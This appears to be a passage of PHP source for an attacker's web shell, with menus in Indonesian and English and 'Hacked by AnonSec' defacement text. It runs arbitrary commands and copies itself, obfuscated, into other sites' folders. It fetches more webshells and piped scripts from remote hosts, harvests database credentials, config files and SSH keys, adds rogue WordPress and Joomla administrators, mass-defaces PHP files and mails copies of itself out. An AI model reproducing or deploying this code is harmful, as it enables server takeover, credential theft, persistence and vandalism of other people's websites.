        $a = scandir("/var/named");
        return count($a)." Domains";
    } elseif (is_readable("/etc/passwd")) {
        $a = file_get_contents("/etc/passwd");
        if (preg_match("/\/vhosts\//i", $a) && preg_match("/\/bin\/false/i", $a)) {
            preg_match_all("/\/vhosts\/(.*?):/i", $a, $b);
            $b = $b[1]; return count(array_unique($b))." Domains";
        } else {
            preg_match_all("/\/home\/(.*?):/i", $a, $b);
            $b = $b[1]; return count(array_unique($b))." Domains";
        }
    } elseif (!empty(shell_exec("cat /etc/passwd"))) {
        $a = shell_exec("cat /etc/passwd");
        if (preg_match("/\/vhosts\//i", $a) && preg_match("/\/bin\/false/i", $a)) {
            preg_match_all("/\/vhosts\/(.*?):/i", $a, $b);
            $b = $b[1]; return count(array_unique($b))." Domains";
        } else {
            preg_match_all("/\/home\/(.*?):/i", $a, $b);
            $b = $b[1]; return count(array_unique($b))." Domains";
        }
    } else { return "0 Domains"; }
}

function esyeem($tg, $lk) {
    if (function_exists("symlink")) { return symlink($tg, $lk); }
    elseif (function_exists("proc_open")) {
        $ps = proc_open("ln -s ".$tg." ".$lk, [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","r"]], $pipes, $lk);
        return htmlspecialchars(stream_get_contents($pipes[1]));
    } else { return "Symlink Function is Disabled !"; }
}

function sds($sads, &$results = array()) {
    if (!is_readable($sads) || !is_writable($sads) || preg_match("/\/application\/|\/system/i", $sads)) return false;
    $files = scandir($sads);
    foreach ($files as $value) {
        $path = realpath($sads . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {} else if ($value != "." && $value != "..") { sds($path, $results); $results[] = $path; }
    }
    return $results;
}

function crul($web) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $web);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    return curl_exec($ch);
}

function green($text) { echo "<center><font color='#00ff9d'>".$text."</center></font>"; }
function red($text) { echo "<center><font color='#ff4444'>".$text."</center></font>"; }
function oren($text) { return "<center><font color='#ffa500'>".$text."</center></font>"; }
function tuls($nm, $lk) { return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"; }
function statusnya($fl){ $izin = substr(sprintf('%o', fileperms($fl)), -4); return $izin; }

// ============================================================
// INFO SERVER
// ============================================================
echo "Server IP : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER[$rad]."</font><br>";
echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='gold'>".@php_uname()."</font><br>";
echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
echo "Disable Function : ".$disf."</font><br>";
echo "Domains : <font color=gold>".(empty(gtd()) ? '0 Domains' : gtd())."</font><br>";
echo "MySQL : "; if (function_exists("mysql_connect")) echo "<font color=green>ON</font>"; else echo "<font color=red>OFF</font>";
echo " &nbsp;|&nbsp; cURL : "; if (function_exists("curl_init")) echo "<font color=green>ON</font>"; else echo "<font color=red>OFF</font>";
echo " &nbsp;|&nbsp; WGET : "; if (file_exists("/usr/bin/wget")) echo "<font color=green>ON</font>"; else echo "<font color=red>OFF</font>";
echo " &nbsp;|&nbsp; Perl : "; if (file_exists("/usr/bin/perl")) echo "<font color=green>ON</font>"; else echo "<font color=red>OFF</font>";
echo " &nbsp;|&nbsp; Python : "; if (file_exists("/usr/bin/python2")) echo "<font color=green>ON</font>"; else echo "<font color=red>OFF</font>";
echo " &nbsp;|&nbsp; Sudo : "; if (file_exists("/usr/bin/sudo")) echo "<font color=green>ON</font>"; else echo "<font color=red>OFF</font>";
echo " &nbsp;|&nbsp; Pkexec : "; if (file_exists("/usr/bin/pkexec")) echo "<font color=green>ON</font>"; else echo "<font color=red>OFF</font>";
echo "<br>Directory : &nbsp;";

foreach($_POST as $key => $value){ $_POST[$key] = stripslashes($value); }

if(isset($_GET['loknya'])){ $lokasi = $_GET['loknya']; } else { $lokasi = getcwd(); }
$lokasi = str_replace('\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

foreach($lokasis as $id => $lok){
    if($lok == '' && $id == 0){ echo '<a href="?loknya=/">/</a>'; continue; }
    if($lok == '') continue;
    echo '<a href="?loknya=';
    for($i=0;$i<=$id;$i++){ echo $lokasis[$i]; if($i != $id) echo "/"; }
    echo '">'.$lok.'</a>/';
}
echo '<br><br>';

// ============================================================
// UPLOAD & COMMAND
// ============================================================
if (isset($_POST['upwkwk'])) {
    if (isset($_POST['berkasnya'])) {
        if (empty($_FILES['berkas']['name'])) { echo "<font color=orange>File not Selected !</font><br><br>"; }
        else {
            if ($_FILES['berkas']['size'] == 0) { echo "<font color=red>File 0KB — Blocked !</font><br><br>"; }
            else {
                $tg = filemtime($lokasi);
                $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
                if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
                    $fl = $lokasi."/".$_FILES['berkas']['name'];
                    echo "File Uploaded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
                    if (strpos($lokasi, $_SERVER['DOCUMENT_ROOT']) !== false) {
                        $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $wb."/", $fl);
                        echo "Link : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
                    }
                    @touch($lokasi, $tg);@touch($lokasi."/".$_FILES['berkas']['name'], $tg);
                    echo "<br>";
                } else { echo "<font color='red'>Failed to Upload !</font><br><br>"; }
            }
        }
    }
}

echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cdrd().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.crt().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up"><br>
</form>';
echo '<br><form method="post">
Command : <input type="text" name="komend" class="up" value="';
if (isset($_POST['komend'])) { echo htmlspecialchars($_POST['komend']); } else { echo "uname -a"; }
echo '">
<input type="submit" name="komends" value=">>" class="up">
</form>';
echo "<br>";

// ============================================================
// NAVIGASI MENU (UPDATED)
// ============================================================
echo '<div style="font-family: Russo One;flex-wrap:wrap;display:flex;justify-content:center;gap:4px;">';
echo tuls("GRAB", $_SERVER['SCRIPT_NAME']."?loknya=".$lokasi."&opsi=grab");
echo tuls("CONFIG", $_SERVER['SCRIPT_NAME']."?loknya=".$lokasi."&opsi=config");
echo tuls("FIND PASS", $_SERVER['SCRIPT_NAME']."?loknya=".$lokasi."&opsi=findpass");
echo tuls("TEBAR", $_SERVER['SCRIPT_NAME']."?loknya=".$lokasi."&opsi=spread");
$menus = ["HOME"=>"","BACKUP"=>"&opsi=bekup","JUMP"=>"&opsi=lompat","DEFACE"=>"&opsi=mdf","MASS DEFACE 2.0"=>"&opsi=mdf20","SCAN ROOT"=>"&opsi=scanr","SYMLINK"=>"&opsi=esyeem","ALFA"=>"&opsi=alfa","ROOT ME"=>"&opsi=rootme","GS-SOCKET"=>"&opsi=gssocket","CRACK"=>"&opsi=crack","WP ADD"=>"&opsi=wpadd","JML ADD"=>"&opsi=jmladd","HTACCESS"=>"&opsi=htaccess","PHP EXP"=>"&opsi=phpexp","FILE SCAN"=>"&opsi=filescan","KILLER"=>"&opsi=killer","GS-UNINSTALL"=>"&opsi=gsuninstall","PANEL"=>"&opsi=panel","PLUGINS"=>"&opsi=plugins","KERNEL"=>"&opsi=kernel","LSCAN"=>"&opsi=lscan","SSHSCAN"=>"&opsi=sshscan","WINSCAN"=>"&opsi=winscan","DOMAIN"=>"&opsi=domain","LINPEAS"=>"&opsi=linpeas","WP"=>"&opsi=wp","DB DUMP"=>"&opsi=dbdump","AUTO LOGIN"=>"&opsi=autologin","BACKUP SHELL"=>"&opsi=backupshell","TOOLS"=>"&opsi=tools","MASS HTACCESS"=>"&opsi=htaccess_mass","TEBAR WEBSHELL"=>"&opsi=tebar_webshell"];
foreach($menus as $label=>$param){
    $link = $_SERVER['SCRIPT_NAME']."?loknya=".$lokasi.$param;
    echo "[ <a href='".$link."' style='font-size:11px;'>".$label."</a> ] ";
}
echo "</div><br>";

// ============================================================
// HANDLER FITUR
// ============================================================
if (isset($_GET['opsi'])) {
    $opsi = $_GET['opsi'];
    
    // GRAB CONFIG
    if ($opsi == "grab") {
        echo "<h3>🔥 GRAB CONFIG</h3>";
        echo '<form method="post"><input type="text" name="grab_path" value="'.$lokasi.'" class="up" style="width:300px;"><br><br>';
        echo '<select name="grab_target" class="up"><option value="all">Semua Config</option><option value="wp">WordPress</option><option value="joomla">Joomla</option><option value="laravel">Laravel</option></select><br><br>';
        echo '<input type="submit" name="run_grab" value="Grab" class="up"></form>';
        if (isset($_POST['run_grab'])) {
            $path = $_POST['grab_path'];
            $target = $_POST['grab_target'];
            echo "<pre>";
            if ($target == 'all' || $target == 'wp') {
                echo komenb('find '.$path.' -maxdepth 5 -name wp-config.php -type f 2>/dev/null | head -10', $lokasi);
            }
            if ($target == 'all' || $target == 'joomla') {
                echo komenb('find '.$path.' -maxdepth 5 -name configuration.php -type f 2>/dev/null | head -10', $lokasi);
            }
            if ($target == 'all' || $target == 'laravel') {
                echo komenb('find '.$path.' -maxdepth 5 -name .env -type f 2>/dev/null | head -10', $lokasi);
            }
            echo "</pre>";
        }
        die(author());
    }

    // CONFIG SCANNER
    if ($opsi == "config") {
        echo "<h3>🔥 CONFIG SCANNER</h3>";
        echo '<form method="post"><input type="text" name="config_path" value="'.$lokasi.'" class="up" style="width:300px;"><br><br>';
        echo '<input type="submit" name="run_config" value="Scan" class="up"></form>';
        if (isset($_POST['run_config'])) {
            $path = $_POST['config_path'];
            echo "<pre>";
            echo komenb('find '.$path.' -maxdepth 5 -type f \( -name "wp-config.php" -o -name ".env" -o -name "configuration.php" -o -name "settings.php" -o -name "database.php" \) -exec grep -H "password\|DB_PASSWORD\|DB_USER\|DB_NAME" {} \; 2>/dev/null | head -50', $lokasi);
            echo "</pre>";
        }
        die(author());
    }

    // FIND PASS
    if ($opsi == "findpass") {
        echo "<h3>🔥 FIND PASSWORD</h3>";
        echo '<form method="post"><input type="text" name="find_path" value="'.$lokasi.'" class="up" style="width:300px;"><br><br>';
        echo '<input type="text" name="find_keyword" value="password|pass|pwd|key|secret" class="up" style="width:200px;"><br><br>';
        echo '<input type="submit" name="run_findpass" value="Find" class="up"></form>';
        if (isset($_POST['run_findpass'])) {
            $path = $_POST['find_path'];
            $keyword = $_POST['find_keyword'];
            echo "<pre>";
            echo komenb('find '.$path.' -maxdepth 5 -type f -exec grep -HnE "'.$keyword.'" {} \; 2>/dev/null | head -50', $lokasi);
            echo "</pre>";
        }
        die(author());
    }

    // SPREAD
    if ($opsi == "spread") {
        echo "<h3>🔥 SPREAD SHELL</h3>";
        echo '<form method="post"><input type="text" name="spread_path" value="/home/" class="up" style="width:300px;"><br><br>';
        echo '<input type="number" name="spread_max" value="10" class="up"><br><br>';
        echo '<input type="submit" name="run_spread" value="Spread" class="up"></form>';
        if (isset($_POST['run_spread'])) {
            $target = $_POST['spread_path'];
            $max = intval($_POST['spread_max']);
            $content = file_get_contents(__FILE__);
            echo "<pre>";
            $folders = komenb('find '.$target.' -maxdepth 3 -type d -name "public_html" -o -name "www" -o -name "htdocs" 2>/dev/null | head -'.$max, $lokasi);
            if ($folders) {
                foreach (explode("
", $folders) as $folder) {
                    $folder = trim($folder);
                    if ($folder && is_dir($folder) && is_writable($folder)) {
                        $fname = '.systemd_'.rand(1000,9999).'.php';
                        obfuscate_file(__FILE__, $folder.'/'.$fname);
                        echo "✅ Copied to: $folder/$fname (obfuscated)
";
                    }
                }
            }
            echo "</pre>";
        }
        die(author());
    }

    // BACKUP SHELL
    if ($opsi == "bekup") {
        echo "<h3>🔥 BACKUP SHELL</h3>";
        echo '<form method="post"><input type="text" name="lokruna" value="'.$lokasi.'" class="up" style="width:300px;"><br><br>';
        echo '<input type="submit" name="palepale" value="Backup" class="up"></form>';
        if (isset($_POST['palepale'])) {
            $path = $_POST['lokruna'];
            $fname = '.backup_'.date('Ymd_His').'.php';
            obfuscate_file(__FILE__, $path.'/'.$fname);
            green("Backup saved: $path/$fname (obfuscated)");
        }
        die(author());
    }

    // JUMP
    if ($opsi == "lompat") {
        echo "<h3>🔥 JUMP</h3>";
        $passwd = file_get_contents("/etc/passwd");
        preg_match_all("/\/home\/(.*?):/i", $passwd, $users);
        foreach (array_unique($users[1]) as $user) {
            $path = "/home/$user/public_html";
            if (is_dir($path)) {
                echo "<a href='?loknya=$path'>$path</a><br>";
            }
        }
        die(author());
    }

    // DEFACE
    if ($opsi == "mdf") {
        echo "<h3>🔥 MASS DEFACE</h3>";
        echo '<form method="post"><input type="text" name="lokena" value="'.$lokasi.'" class="up"><br><br>';
        echo '<input type="text" name="nfil" value="index.php" class="up"><br><br>';
        echo '<textarea name="isikod" class="up" rows="5" cols="50"><?php echo "Hacked by AnonSec"; ?></textarea><br><br>';
        echo '<input type="submit" name="palepale" value="Deface" class="up"></form>';
        if (isset($_POST['palepale'])) {
            $dir = $_POST['lokena'];
            $file = $_POST['nfil'];
            $content = $_POST['isikod'];
            $subdirs = scandir($dir);
            foreach ($subdirs as $sub) {
                if ($sub == '.' || $sub == '..') continue;
                if (is_dir($dir.'/'.$sub) && is_writable($dir.'/'.$sub)) {
                    file_put_contents($dir.'/'.$sub.'/'.$file, $content);
                    echo "✅ $dir/$sub/$file
";
                }
            }
        }
        die(author());
    }

    // MASS DEFACE 2.0
    if ($opsi == "mdf20") {
        echo "<h3>🔥 MASS DEFACE 2.0</h3>";
        echo '<form method="post"><input type="text" name="mdf_path" value="'.$lokasi.'" class="up"><br><br>';
        echo '<textarea name="mdf_content" class="up" rows="5" cols="50"><?php echo "Hacked by AnonSec"; ?></textarea><br><br>';
        echo '<select name="mdf_mode" class="up"><option value="prepend">Prepend</option><option value="append">Append</option><option value="replace">Replace</option></select><br><br>';
        echo '<input type="submit" name="run_mdf20" value="Deface" class="up"></form>';
        if (isset($_POST['run_mdf20'])) {
            $path = $_POST['mdf_path'];
            $content = $_POST['mdf_content'];
            $mode = $_POST['mdf_mode'];
            $files = komenb('find '.$path.' -type f -name "*.php" 2>/dev/null | head -50', $lokasi);
            if ($files) {
                foreach (explode("
", $files) as $file) {
                    $file = trim($file);
                    if ($file && file_exists($file) && is_writable($file)) {
                        $orig = file_get_contents($file);
                        if ($mode == 'prepend') file_put_contents($file, $content."
".$orig);
                        elseif ($mode == 'append') file_put_contents($file, $orig."
".$content);
                        else file_put_contents($file, $content);
                        echo "✅ $file
";
                    }
                }
            }
        }
        die(author());
    }

    // SCAN ROOT
    if ($opsi == "scanr") {
        echo "<h3>🔥 SCAN ROOT</h3>";
        echo komend("uname -a", $lokasi);
        echo komend("id", $lokasi);
        echo komend("find / -perm -4000 -type f 2>/dev/null | head -20", $lokasi);
        die(author());
    }

    // SYMLINK
    if ($opsi == "esyeem") {
        echo "<h3>🔥 SYMLINK</h3>";
        $passwd = file_get_contents("/etc/passwd");
        preg_match_all("/\/home\/(.*?):/i", $passwd, $users);
        foreach (array_unique($users[1]) as $user) {
            $target = "/home/$user/public_html";
            if (is_dir($target)) {
                $link = "sym_".$user.".txt";
                symlink($target, $link);
                echo "<a href='$link'>$target</a><br>";
            }
        }
        die(author());
    }

    // ALFA
    if ($opsi == "alfa") {
        echo "<h3>🔥 ALFA WEBSHELL</h3>";
        if (!is_writable($lokasi)) die("Directory not writable!");
        $url = "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/batosay.php";
        $content = file_get_contents($url);
        if (strlen($content) > 1000) {
            file_put_contents($lokasi."/alfa.php", $content);
            echo "✅ Alfa installed: <a href='alfa.php' target='_blank'>alfa.php</a>";
        } else {
            echo "❌ Failed to download.";
        }
        die(author());
    }

    // ROOT ME
    if ($opsi == "rootme") {
        echo "<h3>🔥 ROOT ME</h3>";
        echo komend("uname -a", $lokasi);
        echo komend("id", $lokasi);
        echo komend("curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | head -100", $lokasi);
        die(author());
    }

    // GS-SOCKET
    if ($opsi == "gssocket") {
        echo "<h3>🔥 GS-SOCKET</h3>";
        if (!is_writable($lokasi)) die("Directory not writable!");
        $url = "https://raw.githubusercontent.com/anonsec/gs-socket/main/gs-socket.php";
        $content = file_get_contents($url);
        if (strlen($content) > 1000) {
            file_put_contents($lokasi."/gs-socket.php", $content);
            echo "✅ GS-Socket installed: <a href='gs-socket.php' target='_blank'>gs-socket.php</a>";
        } else {
            echo "❌ Failed to download.";
        }
        die(author());
    }

    // CRACK
    if ($opsi == "crack") {
        echo "<h3>🔥 CRACK</h3>";
        echo '<form method="post"><input type="text" name="target" placeholder="Target IP" class="up"><br><br>';
        echo '<input type="text" name="user" placeholder="Username" class="up"><br><br>';
        echo '<input type="text" name="pass" placeholder="Password" class="up"><br><br>';
        echo '<input type="submit" name="run_crack" value="Test Login" class="up"></form>';
        if (isset($_POST['run_crack'])) {
            $target = $_POST['target'];
            $user = $_POST['user'];
            $pass = $_POST['pass'];
            echo komend("sshpass -p '$pass' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no $user@$target 'echo ok' 2>&1", $lokasi);
        }
        die(author());
    }

    // WP ADD USER
    if ($opsi == "wpadd") {
        echo "<h3>🔥 WP ADD USER</h3>";
        echo '<form method="post"><input type="text" name="wp_path" value="'.$lokasi.'" class="up"><br><br>';
        echo '<input type="text" name="wp_user" placeholder="Username" class="up"><br><br>';
        echo '<input type="text" name="wp_pass" placeholder="Password" class="up"><br><br>';
        echo '<input type="text" name="wp_email" placeholder="Email" class="up"><br><br>';
        echo '<input type="submit" name="run_wpadd" value="Add User" class="up"></form>';
        if (isset($_POST['run_wpadd'])) {
            $path = $_POST['wp_path'];
            $user = $_POST['wp_user'];
            $pass = md5($_POST['wp_pass']);
            $email = $_POST['wp_email'];
            $wpconfig = $path.'/wp-config.php';
            if (file_exists($wpconfig)) {
                require_once($wpconfig);
                $conn = @new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
                if (!$conn->connect_error) {
                    $conn->query("INSERT INTO wp_users (user_login, user_pass, user_email, user_registered) VALUES ('$user', '$pass', '$email', NOW())");
                    $id = $conn->insert_id;
                    $conn->query("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ($id, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}')");
                    green("User $user added!");
                } else red("DB connection failed");
            } else red("wp-config.php not found");
        }
        die(author());
    }

    // JML ADD USER
    if ($opsi == "jmladd") {
        echo "<h3>🔥 JML ADD USER</h3>";
        echo '<form method="post"><input type="text" name="jml_path" value="'.$lokasi.'" class="up"><br><br>';
        echo '<input type="text" name="jml_user" placeholder="Username" class="up"><br><br>';
        echo '<input type="text" name="jml_pass" placeholder="Password" class="up"><br><br>';
        echo '<input type="text" name="jml_email" placeholder="Email" class="up"><br><br>';
        echo '<input type="submit" name="run_jmladd" value="Add User" class="up"></form>';
        if (isset($_POST['run_jmladd'])) {
            $path = $_POST['jml_path'];
            $user = $_POST['jml_user'];
            $pass = md5($_POST['jml_pass']);
            $email = $_POST['jml_email'];
            $config = $path.'/configuration.php';
            if (file_exists($config)) {
                require_once($config);
                $conn = @new mysqli($host, $user, $password, $db);
                if (!$conn->connect_error) {
                    $conn->query("INSERT INTO {$dbprefix}users (name, username, email, password, block) VALUES ('$user', '$user', '$email', '$pass', 0)");
                    $id = $conn->insert_id;
                    $conn->query("INSERT INTO {$dbprefix}user_usergroup_map (user_id, group_id) VALUES ($id, 8)");
                    green("User $user added as Super User!");
                } else red("DB connection failed");
            } else red("configuration.php not found");
        }
        die(author());
    }

    // HTACCESS
    if ($opsi == "htaccess") {
        echo "<h3>🔥 HTACCESS</h3>";
        echo '<form method="post"><select name="ht_mode" class="up"><option value="allow_all">Allow All</option><option value="deny_all">Deny All Except Current</option></select><br><br>';
        echo '<input type="submit" name="run_htaccess" value="Create .htaccess" class="up"></form>';
        if (isset($_POST['run_htaccess'])) {
            $mode = $_POST['ht_mode'];
            $content = ($mode == 'allow_all') 
                ? "Order Allow,Deny
Allow from all
Options +Indexes" 
                : "Order Deny,Allow
Deny from all
<Files "".basename(__FILE__)."">
Allow from all
</Files>";
            file_put_contents($lokasi.'/.htaccess', $content);
            green(".htaccess created in $lokasi");
        }
        die(author());
    }

    // PHP EXP
    if ($opsi == "phpexp") {
        echo "<h3>🔥 PHP EXPLOIT</h3>";
        echo '<form method="post"><input type="text" name="pwn_cmd" placeholder="Command" class="up" value="whoami"><br><br>';
        echo '<input type="submit" name="run_pwn" value="Execute" class="up"></form>';
        if (isset($_POST['run_pwn'])) {
            $cmd = $_POST['pwn_cmd'];
            system($cmd);
        }
        die(author());
    }

    // FILE SCAN
    if ($opsi == "filescan") {
        echo "<h3>🔥 FILE SCAN</h3>";
        echo '<form method="post"><input type="number" name="scan_minutes" placeholder="Menit terakhir" class="up" value="5"><br><br>';
        echo '<input type="submit" name="run_filescan" value="Scan" class="up"></form>';
        if (isset($_POST['run_filescan'])) {
            $minutes = intval($_POST['scan_minutes']);
            $cutoff = time() - ($minutes * 60);
            $files = scandir($lokasi);
            foreach ($files as $f) {
                if ($f == '.' || $f == '..') continue;
                $p = $lokasi.'/'.$f;
                if (is_file($p) && filemtime($p) >= $cutoff) {
                    echo "$f (".date('Y-m-d H:i:s', filemtime($p)).")<br>";
                }
            }
        }
        die(author());
    }

    // KILLER
    if ($opsi == "killer") {
        echo "<h3>🔥 SHELL KILLER</h3>";
        echo komend("ps aux | grep -E 'bash|sh|php|perl|python|nc|socat' | grep -v grep", $lokasi);
        echo '<form method="post"><input type="submit" name="run_killer" value="Kill All Shells" class="up"></form>';
        if (isset($_POST['run_killer'])) {
            echo komend("pkill -f 'bash|sh|php|perl|python|nc|socat' 2>&1", $lokasi);
            green("Processes killed");
        }
        die(author());
    }

    // GS-UNINSTALL
    if ($opsi == "gsuninstall") {
        echo "<h3>🔥 GS-UNINSTALL</h3>";
        echo komend('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1', $lokasi);
        die(author());
    }

    // DB DUMP
    if ($opsi == "dbdump") {
        echo "<h3>🔥 DB DUMP</h3>";
        echo komenb('find '.$lokasi.' -name "wp-config.php" -exec grep -H "DB_NAME\|DB_USER\|DB_PASSWORD" {} \; 2>/dev/null | head -20', $lokasi);
        die(author());
    }

    // AUTO LOGIN
    if ($opsi == "autologin") {
        echo "<h3>🔥 AUTO LOGIN</h3>";
        echo '<form method="post"><input type="text" name="login_target" placeholder="Target IP" class="up"><br><br>';
        echo '<input type="text" name="login_user" placeholder="Username" class="up"><br><br>';
        echo '<input type="text" name="login_pass" placeholder="Password" class="up"><br><br>';
        echo '<input type="submit" name="run_autologin" value="Test" class="up"></form>';
        if (isset($_POST['run_autologin'])) {
            $target = $_POST['login_target'];
            $user = $_POST['login_user'];
            $pass = $_POST['login_pass'];
            $panels = [
                ['name'=>'cPanel','url'=>"https://$target:2083"],
                ['name'=>'WHM','url'=>"https://$target:2087"],
                ['name'=>'Plesk','url'=>"https://$target:8443"],
                ['name'=>'DirectAdmin','url'=>"http://$target:2222"],
            ];
            foreach ($panels as $p) {
                $cmd = "curl -s -k -m 5 -L '{$p['url']}' 2>/dev/null | head -20";
                echo komend($cmd, $lokasi);
            }
        }
        die(author());
    }

    // BACKUP SHELL
    if ($opsi == "backupshell") {
        echo "<h3>🔥 BACKUP SHELL</h3>";
        echo '<form method="post"><input type="email" name="backup_email" placeholder="Email tujuan" class="up"><br><br>';
        echo '<input type="submit" name="run_backupshell" value="Backup" class="up"></form>';
        if (isset($_POST['run_backupshell'])) {
            $email = $_POST['backup_email'];
            $content = file_get_contents(__FILE__);
            $headers = "From: backup@".$_SERVER['HTTP_HOST']."
Content-Type: text/plain; charset=UTF-8";
            mail($email, "Shell Backup - ".$_SERVER['HTTP_HOST'], $content, $headers);
            green("Backup sent to $email");
        }
        die(author());
    }

    // PANEL FINDER
    if ($opsi == "panel") {
        echo "<h3>🔥 PANEL FINDER</h3>";
        $panels = [
            'cPanel' => 'test -d /usr/local/cpanel && echo "YES"',
            'WHM' => 'test -d /usr/local/cpanel &&echo "YES"',
            'Plesk' => 'which plesk 2>/dev/null && plesk version 2>/dev/null || echo ""',
            'DirectAdmin' => 'test -d /usr/local/directadmin && echo "YES"',
            'CWP' => 'test -d /usr/local/cwp && echo "YES"',
            'CyberPanel' => 'test -d /usr/local/CyberPanel && echo "YES"',
            'VestaCP' => 'test -d /usr/local/vesta && echo "YES"',
            'Webmin' => 'test -d /usr/share/webmin && echo "YES"',
        ];
        foreach ($panels as $name => $check) {
            $result = trim(komenb($check, $lokasi));
            if ($result === 'YES' || !empty($result)) {
                echo "✅ $name terdeteksi<br>";
            }
        }
        die(author());
    }

    // PLUGINS
    if ($opsi == "plugins") {
        echo "<h3>🔥 PLUGINS</h3>";
        echo komend("php -m 2>/dev/null | head -30", $lokasi);
        die(author());
    }

    // KERNEL
    if ($opsi == "kernel") {
        echo "<h3>🔥 KERNEL EXPLOIT</h3>";
        echo komend("uname -a", $lokasi);
        echo komend("cat /etc/os-release 2>/dev/null | head -5", $lokasi);
        echo komend("curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash 2>/dev/null | head -50", $lokasi);
        die(author());
    }

    // LSCAN
    if ($opsi == "lscan") {
        echo "<h3>🔥 LINUX SCAN</h3>";
        echo komend("uname -a", $lokasi);
        echo komend("id", $lokasi);
        echo komend("find / -perm -4000 -type f 2>/dev/null | head -20", $lokasi);
        echo komend("sudo -l 2>/dev/null", $lokasi);
        echo komend("cat /etc/crontab 2>/dev/null", $lokasi);
        die(author());
    }

    // SSHSCAN
    if ($opsi == "sshscan") {
        echo "<h3>🔥 SSH KEY SCAN</h3>";
        echo komend('find /root /home /etc/ssh -name "id_rsa" -o -name "id_ecdsa" -o -name "authorized_keys" 2>/dev/null | head -20', $lokasi);
        die(author());
    }

    // WINSCAN
    if ($opsi == "winscan") {
        echo "<h3>🔥 WINDOWS SCAN</h3>";
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            echo komend("systeminfo 2>nul | findstr /B /C:'OS Name' /C:'OS Version' /C:'System Type'", $lokasi);
            echo komend("whoami /priv 2>nul", $lokasi);
            echo komend("net user 2>nul", $lokasi);
        } else {
            echo "Not a Windows system.";
        }
        die(author());
    }

    // DOMAIN
    if ($opsi == "domain") {
        echo "<h3>🔥 DOMAIN SCAN</h3>";
        echo komend("cat /etc/localdomains 2>/dev/null | head -30", $lokasi);
        echo komend("grep -rh 'ServerName' /etc/httpd/conf.d/ 2>/dev/null | head -30", $lokasi);
        die(author());
    }

    // LINPEAS
    if ($opsi == "linpeas") {
        echo "<h3>🔥 LINPEAS</h3>";
        echo komend("curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | head -200", $lokasi);
        die(author());
    }

    // WP
    if ($opsi == "wp") {
        echo "<h3>🔥 WORDPRESS MANAGER</h3>";
        $wpconfig = komenb('find '.$lokasi.' -maxdepth 4 -name wp-config.php -type f 2>/dev/null | head -1', $lokasi);
        if ($wpconfig) {
            require_once(trim($wpconfig));
            $conn = @new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
            if (!$conn->connect_error) {
                $result = $conn->query("SELECT ID,user_login,user_email FROM wp_users");
                if ($result) {
                    echo "<table border='1'><tr><th>ID</th><th>Username</th><th>Email</th></tr>";
                    while ($row = $result->fetch_assoc()) {
                        echo "<tr><td>{$row['ID']}</td><td>{$row['user_login']}</td><td>{$row['user_email']}</td></tr>";
                    }
                    echo "</table>";
                }
            }
        } else {
            echo "WordPress not found.";
        }
        die(author());
    }

    // TOOLS
    if ($opsi == "tools") {
        echo "<h3>🛠️ TOOLS</h3>";
        echo "<a href='?loknya=$lokasi&opsi=grab_config'>📁 Grab Config</a><br>";
        echo "<a href='?loknya=$lokasi&opsi=hashiden'>🔑 Hash Identifier</a><br>";
        echo "<a href='?loknya=$lokasi&opsi=lockfile'>🔒 Lock File</a><br>";
        echo "<a href='?loknya=$lokasi&opsi=scanshell'>🔍 Shell Finder</a><br>";
        echo "<a href='?loknya=$lokasi&opsi=massdef'>💥 Mass Deface</a><br>";
        echo "<a href='?loknya=$lokasi&opsi=adminer'>🗄️ Adminer Installer</a><br>";
        die(author());
    }

    // GRAB CONFIG (symlink massal)
    if ($opsi == "grab_config") {
        echo "<h3>📁 GRAB CONFIG</h3>";
        echo '<form method="post"><textarea name="passwd" rows="10" cols="50">';
        $uSr = @file("/etc/passwd");
        if ($uSr) {
            foreach($uSr as $usrr) { $str = explode(":",$usrr); echo $str[0]."
"; }
        }
        echo '</textarea><br><input type="submit" name="conf" value="Grab" class="up"></form>';
        if (isset($_POST['conf'])) {
            $folfig = "backdoorcfg";
            @mkdir($folfig, 0755);
            @chdir($folfig);
            $passwd = explode("
", $_POST["passwd"]);
            foreach($passwd as $pwd) {
                $user = trim($pwd);
                if (empty($user)) continue;
                @symlink('/home/'.$user.'/public_html/wp-config.php', $user.'-WORDPRESS.txt');
                @symlink('/home/'.$user.'/public_html/configuration.php', $user.'-JOOMLA.txt');
                @symlink('/home/'.$user.'/.accesshash', $user.'-WHM.txt');
                @symlink('/home/'.$user.'/.my.cnf', $user.'-MYSQL.txt');
            }
